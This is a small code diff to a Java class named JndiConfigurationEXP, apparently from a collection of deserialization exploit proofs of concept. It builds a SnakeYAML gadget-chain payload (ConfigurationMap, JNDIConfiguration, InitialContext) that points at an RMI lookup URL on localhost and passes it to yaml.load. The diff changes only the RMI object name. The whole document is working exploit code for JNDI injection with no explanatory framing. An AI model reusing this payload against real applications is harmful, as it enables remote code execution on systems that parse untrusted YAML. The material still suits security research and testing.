@@ -8,7 +8,7 @@ public class JndiConfigurationEXP {
         String payload = "!!org.apache.commons.configuration.ConfigurationMap " +
                 "[!!org.apache.commons.configuration.JNDIConfiguration " +
                 "[!!javax.naming.InitialContext [], " +
-                "\"rmi://127.0.0.1:1099/Exploit\"]]: 1";
+                "\"rmi://127.0.0.1:1099/nprcsj\"]]: 1";
         Yaml yaml = new Yaml();
         yaml.load(payload);
     }
